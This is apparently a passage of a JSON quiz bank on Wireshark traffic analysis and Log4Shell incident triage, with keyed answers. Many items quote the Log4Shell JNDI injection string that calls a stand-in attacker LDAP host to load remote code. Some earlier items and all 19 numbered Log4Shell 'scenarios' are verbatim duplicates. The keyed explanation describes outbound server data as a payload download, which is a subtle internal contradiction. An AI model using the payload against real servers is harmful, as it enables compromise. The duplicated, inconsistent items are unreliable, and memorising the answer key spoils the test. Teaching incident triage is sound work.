    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_095",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_096",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_097",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_098",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_099",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_100",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_101",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 1] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_102",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 2] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_103",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 3] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_104",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 4] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_105",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 5] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_106",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 6] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_107",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 7] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_108",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 8] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_109",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 9] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_110",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 10] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_111",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 11] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_112",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 12] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_113",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 13] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_114",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 14] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_115",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 15] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_116",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 16] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_117",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 17] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_118",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 18] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
    "explanation": "The packet telemetry proves the full exploitation chain succeeded: the server parsed the JNDI lookup, initiated an outbound connection on port 1389, completed the 3-way handshake, and downloaded 4,200 bytes of data (the malicious Java class). Strict egress filtering blocking outbound LDAP/RMI would have prevented the payload download."
  },
  {
    "id": "q_c2_m8_119",
    "topic": "Log4Shell Exploit Analysis & Outbound Traffic Triage",
    "difficulty": "difficult",
    "q": "[CISA Emergency Directive AA21-356A Scenario 19] In December 2021, an enterprise SOC detects an external attacker submitting HTTP GET requests containing the payload \"${jndi:ldap://203.0.113.55:1389/Exploit}\" against internal web server 172.30.5.10. An analyst captures traffic on the perimeter firewall. Applying the filter \"tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 1389\" reveals that the internal web server immediately transmitted a TCP SYN to 203.0.113.55 on port 1389, followed by an immediate SYN-ACK from the attacker, a completed 3-way handshake, and 4,200 bytes of outbound TCP data before terminating. What does this packet evidence conclusively prove regarding the incident?",
    "options": [
      "The server was vulnerable to Log4Shell (CVE-2021-44228), successfully executed the malicious JNDI string, connected out to the attacker's LDAP server, and downloaded/executed the secondary Java payload; the host is fully compromised.",
      "The firewall successfully blocked the attack because LDAP is an unroutable protocol.",
      "The attack was a false positive because Log4j only operates over UDP port 53.",
      "The attacker's server crashed because 1389 is an invalid TCP port number."
    ],
    "correct": 0,
